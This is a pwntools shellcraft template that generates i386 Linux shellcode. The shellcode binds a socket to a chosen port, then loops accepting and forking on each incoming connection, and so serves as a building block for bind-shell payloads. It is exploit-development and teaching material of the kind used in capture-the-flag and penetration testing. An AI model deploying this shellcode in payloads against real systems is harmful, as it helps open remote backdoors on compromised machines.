<%
  from pwnlib.shellcraft import common
  from pwnlib.shellcraft import i386
  from socket import htons
%>
<%page args="port"/>
<%docstring>
    Args: port
    Waits for a connection.  Leaves socket in EBP.
    ipv4 only
</%docstring>
<%
  acceptloop = common.label("acceptloop")
  looplabel = common.label("loop")
%>

${acceptloop}:
        /*  Listens for and accepts a connection on ${int(port)}d forever */
        /*  Socket file descriptor is placed in EBP */

        /*  sock = socket(AF_INET, SOCK_STREAM, 0) */
        xor edx, edx
        push edx                            /*  IPPROTO_IP (= 0) */
        push SYS_socketcall_socket          /*  SOCK_STREAM */
        push AF_INET
        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_socket', 'esp')}

        ${i386.linux.mov('esi', 'eax')}      /* keep socket fd */

        /*  bind(sock, &addr, sizeof addr); // sizeof addr == 0x10 */
        push edx
        /* ${htons(port)} == htons(${port}) */
        ${i386.linux.push('AF_INET | (%d << 16)' % htons(port))}
        ${i386.linux.mov('ecx', 'esp')}
        push 0x10               /* sizeof addr */
        push ecx                /* &addr */
        push eax                /* sock */
        ${i386.linux.mov('ecx', 'esp')}
        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_bind', 'esp')}

        /*  listen(sock, whatever) */
        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_listen')}


${looplabel}:
        /*  accept(sock, NULL, NULL) */
        push edx
        push esi                /*  sock */
        ${i386.linux.syscall('SYS_socketcall', 'SYS_socketcall_accept', 'esp')}

        ${i386.linux.mov('ebp', 'eax')}      /* keep in-comming socket fd */

        ${i386.linux.syscall('SYS_fork')}
        xchg eax, edi

        test edi, edi
        ${i386.linux.mov('ebx', 'ebp')}
        cmovz ebx, esi /*  on child we close the server sock instead */

        /*  close(sock) */
        ${i386.linux.syscall('SYS_close', 'ebx')}

        test edi, edi
        jnz ${looplabel}
